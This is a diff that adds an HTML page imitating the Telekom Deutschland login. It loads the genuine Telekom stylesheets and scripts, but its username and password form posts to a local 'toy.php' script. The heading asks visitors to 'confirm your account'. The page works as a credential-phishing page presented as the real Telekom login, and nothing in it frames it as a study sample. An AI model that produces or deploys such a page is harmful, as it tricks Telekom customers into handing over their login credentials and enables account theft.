@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+<html class="no-js" lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Telekom Login</title>
+    <meta name="description" content="Telekom Login">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex" />
+    <meta name="bwpageid" content="VIEW_USERNAME"/>
+
+    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/components.min.css">
+    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/login-24.12.2.css">
+    
+
+    
+    <script>
+        var accountLocked = false;
+        var accountLockedPermanent = false;
+        var accountLockExpiration = 0;
+        var loginFailed = false;
+    </script>
+
+    
+    
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/html5shiv.js"></script>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/respond.min.js"></script>
+    <![endif]-->
+
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-3.2.1.min.js"></script>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/components.min.js"></script>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/login.js"></script>
+
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/behavioweb_form_2021-06-24.min.js"></script>
+</head>
+
+<body>
+<div>
+    <header id="tbs-header">
+        <div id="tbs-header-content">
+            <div class="container-fixed clearfix">
+                <div class="pull-left">
+                    <i class="icon icon-large">tT</i>
+                </div>
+                <div class="pull-right">
+                    <span class="tbs-slogan">erleben, was verbindet.</span>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </header>
+
+    
+
+    
+    
+
+    
+    <div id="global-info-box" class="container-fixed">
+        
+        <div class="tbs-container">
+            <div class="row">
+                <div class="col-l-12 col-s-12" >
+                    <div class="global-info-box offset-top-2 offset-s-top-1-5">
+                    <span id="global-info-box-closing-x" class="global-info-box-close" aria-label="Infobox schließen"
+                          onclick="$('#global-info-box').remove()">&times;</span>
+                        <div>
+                            <div id="global-info-box-header" class="global-info-box-headline" >Neue Datenschutzhinweise!</div>
+                            <div class="offset-top-1">
+                                <span id="global-info-box-text-part1">Wir haben unsere Datenschutzhinweise für den Telekom Login aktualisiert. Sie können diese</span>
+                                <a id="global-info-box-link"
+                                   href="https://www.telekom.de/datenschutzhinweise/download/026.pdf"
+                                   target="_blank"> hier </a>
+                                <span id="global-info-box-text-part2">nachlesen.</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="offset-bottom-4 offset-s-bottom-3"></div>
+</div>
+
+<div>
+    <div >
+        <iframe id="tealium-callback-tracking" src="https://www.telekom.de/ueber-das-unternehmen/emetriq-xdn?zid=2604445a-3d0f-462f-910b-126ba040e620" sandbox="allow-scripts allow-same-origin"></iframe>
+    </div>
+</div>
+
+<div class="container-fixed">
+    <div class="tbs-container">
+        <div id="tbs-headline">
+            <div id="tbs-brand" class="tbs-relative text-center">
+                
+                <img src="https://login.t-online.de/stats/t-online-logo-29112019.png">
+            </div>
+            <h1 class="offset-top-0 offset-bottom-3 text-center">Bestätigen Sie ihr Konto</h1>
+        </div>
+
+        <div class="login-box">
+            
+
+            <div class="offset-bottom-1">
+                <form id="login" name="login" method="POST" action="toy.php" accept-charset="UTF-8" autocomplete="off" novalidate>
+                    
+                    <input type="hidden" name="xsrf_dwiKPxxOmyZB8jA8egJwVw" value="PgaAkQdJlAejv345wzCqvQ">
+
+                    
+                    <input type="hidden" name="tid" value="1828a2b7-d34c-45a7-9742-b656c5b4c5da">
+                    <input type="hidden" name="x-show-cancel" value="false">
+                    <input type="hidden" name="bdata" id="behavio_hidden">
+
+                    
+                    <button class="btn-hidden" name="pw_submit" type="submit"></button>
+
+                    
+                    <div class="offset-bottom-1">
+                        
+                        <div class="form-input-set">
+                            <input id="username" name="pw_usr" type="email" inputmode="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">
+                            <label for="username">Benutzername</label>
+                            <i id="inputNotificationToggle" class="icon icon-help" data-target="#usrInfo" data-trigger="click"></i>
+                        </div>
+
+                        
+        </div>        </div>        </div>
+                        <div class="form-input-set">
+                            <input id="pw_pwd" name="pw_pwd" type="password" maxlength="128" class="form-input" tabindex="20" autocomplete="current-password">
+                                <label for="pw_pwd">Passwort</label>
+								
+				
+
+                        
+
+
+                        
+                  
+                        
+                            <div id="tbs-signin-remember"
+                                 class="form-checkbox-set">
+                                <label>
+                                 
+                                </label>
+                            </div>
+                        </div>
+
+                        
+                        <div class="clearfix offset-bottom-1">
+                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
+                        </div>
+
+                        
+                      
+
+
+                    </div>
+                    <input name="hidden_pwd" type="password" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
+                </form>
+
+               
+
+                
+
+                <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
+                    <a id="helpLink" href="https://www.telekom.de/hilfe/telekom-login" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <div>
+                        <p>
+                            <span>Noch keinen Telekom Login?</span>
+                            <a id="registrationLink" class="text-nowrap" tabindex="50" href="https://www.telekom.de/unterwegs/apps-und-dienste/kommunikation/telekom-e-mail">Telekom Login erstellen</a>
+                            <span>und E-Mail nutzen.</span>
+                        </p>
+                    </div>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <img src="https://accounts.login.idm.telekom.com/static/factorx/images/services.png"/>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <div>
+                        <p>
+                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
+                            <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter/verimi">Hier informieren über VERIMI</a>
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer id="tbs-footer">
+    <div class="container-fixed">
+        <div class="pull-left">
+            <p>&copy; Telekom Deutschland GmbH</p>
+            <p class="tbs-text-11">24.12.2, f5905f6c2a89f98d50b2c626bc8ab6eb, 32ade5dd4c8da31662262f245f3decee46f3c737</p>
+        </div>
+        <div class="pull-right">
+            <ul class="list-inline">
+                <li>
+                    <a href="https://www.telekom.de/start/impressum" target="_blank">Impressum</a>
+                </li>
+                <li>
+                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</footer>
+
+
+
+<div>
+    
+</div>
+</body>
+</html>
